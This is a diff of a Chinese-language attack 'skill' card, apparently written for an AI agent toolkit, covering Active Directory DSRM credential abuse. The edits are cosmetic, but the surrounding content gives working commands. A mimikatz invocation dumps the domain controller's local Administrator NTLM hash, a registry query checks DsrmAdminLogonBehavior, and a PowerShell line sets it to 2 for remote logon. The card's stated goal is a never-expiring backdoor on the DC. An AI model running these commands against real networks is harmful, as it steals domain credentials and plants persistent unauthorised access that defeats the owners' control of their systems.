@@ -4,7 +4,7 @@ description: 'DSRM凭据提取+利用：DC本地Administrator hash、DsrmAdminLo
 disable-model-invocation: true
 metadata: { domain: ad-win, tier: T2 }
 ---
-> 📌 DSH 适配：本技能移植自 RS。原 read_skill/run_skill 调用 = 用 DSH 的 skill 工具按名加载对应技能；fleet/kali-mcp = 用 bash 后台任务与 subagent 工具实现。
+> 📌 DSH 用法：按卡名用 skill 工具加载；长任务用 bash 后台任务、并行侦察用 subagent。
 
 ## DSRM — Directory Services Restore Mode 凭据
 
@@ -16,7 +16,7 @@ metadata: { domain: ad-win, tier: T2 }
 # 在 DC 上以 SYSTEM 运行
 mimikatz.exe "token::elevate" "lsadump::sam" "exit"
 # → 看 .\Administrator 的 NTLM hash
-```
+```text
 
 ### 利用
 ```bash
@@ -28,12 +28,12 @@ reg query HKLM\System\CurrentControlSet\Control\Lsa /v DsrmAdminLogonBehavior
 # 0 = 只能在 DSRM 启动模式用
 # 1 = 可以在正常模式用，但需本地控制台
 # 2 = 可以在正常模式用，远程也行
-```
+```text
 
 ### 修改 DsrmAdminLogonBehavior（已有 SYSTEM 时）
 ```powershell
 New-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Lsa" -Name "DsrmAdminLogonBehavior" -Value 2 -PropertyType DWORD -Force
-```
+```text
 
 ### 场景
 - 已有 SYSTEM on DC，想留一个永不失效的后门
